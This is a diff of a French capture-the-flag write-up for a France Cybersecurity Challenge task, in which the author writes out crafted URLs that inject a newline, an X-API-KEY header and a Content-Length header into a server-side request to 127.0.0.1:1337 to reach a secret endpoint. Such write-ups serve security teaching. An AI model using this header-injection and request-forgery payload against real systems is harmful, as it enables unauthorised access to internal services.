@@ -72,12 +72,12 @@ On constate que le ```HTTP/1.1``` a bien été ajouté dans le corps de la requ�
 Ma première idée consistait à retaper le corps de la requête directement dans l'URL en faisant attention aux sauts de ligne.<br/>
 Je tente de push le header X-API-KEY.<br/>
 ```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12```<br/>
-Aucun résultat, je suppose qu'il y a un header ```Content-Length``` initialisé à 0, ce qui bloque la requête.<br/>
-Je calcule le length de la key.<br/>
+Aucun résultat, je suppose qu'il y a un header ```Content-Length``` initialisé à 0 qui bloque la requête.<br/>
+Je calcule la taille de la clé X-API-KEY.<br/>
 ```py
 >>> print(len("b99cc420eb25205168e83190bae48a12"))
 32
 ```
-J'ajoute le header avec la taille 32.<br/>
+J'ajoute le header ```Content-Length``` avec la taille 32.<br/>
 ```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12%0aContent-length:32```<br/>
-Et là je vois le flag.<br/>
+Done.<br/>
